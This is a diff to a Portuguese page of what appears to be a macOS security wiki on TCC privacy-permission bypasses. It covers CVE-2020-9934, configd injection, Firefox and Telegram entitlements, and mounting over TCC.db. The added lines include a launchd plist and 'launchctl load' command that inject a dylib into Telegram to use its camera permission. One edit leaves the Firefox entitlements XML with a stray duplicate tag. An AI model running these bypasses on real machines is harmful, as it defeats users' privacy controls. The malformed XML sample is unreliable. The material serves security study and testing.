@@ -179,7 +179,7 @@ Como root, você pode habilitar esse serviço e o agente **ARD terá acesso tota
 O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos do usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**. Portanto, se o usuário conseguir reiniciar o TCC com uma variável de ambiente $HOME apontando para uma **pasta diferente**, o usuário poderá criar um novo banco de dados do TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e enganar o TCC para conceder qualquer permissão do TCC a qualquer aplicativo.
 
 {% hint style="success" %}
-Observe que a Apple usa a configuração armazenada no perfil do usuário no atributo **`NFSHomeDirectory`** para o valor de `$HOME`, portanto, se você comprometer um aplicativo com permissões para modificar esse valor (`kTCCServiceSystemPolicySysAdminFiles`), você pode **armar** essa opção com uma bypass do TCC.
+Observe que a Apple usa a configuração armazenada no perfil do usuário no atributo **`NFSHomeDirectory`** para o valor de `$HOME`, portanto, se você comprometer um aplicativo com permissões para modificar esse valor (**`kTCCServiceSystemPolicySysAdminFiles`**), você pode **armar** essa opção com uma bypass do TCC.
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -197,7 +197,7 @@ O **primeiro POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexpo
 5. Importe a entrada de Serviços de Diretório modificada com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
 6. Pare o _tccd_ do usuário e reinicie o processo.
 
-O segundo POC usou **`/usr/libexec/configd`**, que tinha `com.apple.private.tcc.allow` com o valor **`kTCCServiceSystemPolicySysAdminFiles`**.\
+O segundo POC usou **`/usr/libexec/configd`**, que tinha `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
 Era possível executar **`configd`** com a opção **`-t`**, um invasor poderia especificar um **Bundle personalizado para carregar**. Portanto, o exploit **substitui** o método **`dsexport`** e **`dsimport`** de alterar o diretório inicial do usuário por uma **injeção de código do `configd`**.
 
 Para mais informações, consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
@@ -264,7 +264,7 @@ Vários aplicativos da Apple eram vulneráveis a isso.
 
 ### Firefox
 
-O aplicativo Firefox ainda é vulnerável, tendo a permissão `com.apple.security.cs.disable-library-validation`:
+O aplicativo Firefox tinha as permissões `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -276,6 +276,8 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 <key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
 <true/>
 <key>com.apple.security.device.audio-input</key>
 <true/>
@@ -296,15 +298,45 @@ O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha as p
 
 ### CVE-2023-26818 - Telegram
 
-O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-variables` e `com.apple.security.cs.disable-library-validation`, então era possível abusar disso para **acessar suas permissões**, como gravar com a câmera. Você pode [encontrar o payload no artigo](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+O Telegram tinha as permissões **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, então era possível abusar disso para **obter acesso às suas permissões**, como gravar com a câmera. Você pode [encontrar o payload no artigo](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-## Por invocações abertas
+Observe como usar a variável de ambiente para carregar uma biblioteca, um **plist personalizado** foi criado para injetar essa biblioteca e o **`launchctl`** foi usado para iniciá-la:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.telegram.launcher</string>
+<key>RunAtLoad</key>
+<true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/tmp/telegram.dylib</string>
+</dict>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
+</array>
+<key>StandardOutPath</key>
+<string>/tmp/telegram.log</string>
+<key>StandardErrorPath</key>
+<string>/tmp/telegram.log</string>
+</dict>
+</plist>
+```
+
+```bash
+launchctl load com.telegram.launcher.plist
+```
+## Por meio de invocações abertas
 
 É possível invocar o **`open`** mesmo estando em um ambiente sandbox&#x20;
 
 ### Scripts do Terminal
 
-É bastante comum dar ao terminal **Acesso Total ao Disco (FDA)**, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando isso.
+É bastante comum conceder ao terminal o **Acesso Total ao Disco (FDA)**, pelo menos em computadores usados por pessoas da área de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.
 
 Os scripts **`.terminal`** são arquivos plist, como este, com o comando a ser executado na chave **`CommandString`**:
 ```xml
@@ -366,7 +398,7 @@ ls /tmp/snap/Users/admin_user # This will work
 
 Uma explicação mais detalhada pode ser encontrada no [**relatório original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
 
-### CVE-2021-1784 & CVE-2021-30808 - Montagem sobre arquivo TCC
+### CVE-2021-1784 & CVE-2021-30808 - Montar sobre o arquivo TCC
 
 Mesmo que o arquivo TCC DB esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
 
@@ -408,7 +440,7 @@ A pasta **`/var/db/locationd/` não estava protegida contra montagem de DMG**, e
 [macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
 {% endcontent-ref %}
 
-## Por meio de grep
+## Por meio do comando grep
 
 Em várias ocasiões, arquivos armazenam informações sensíveis como e-mails, números de telefone, mensagens... em locais não protegidos (o que é considerado uma vulnerabilidade na Apple).
 
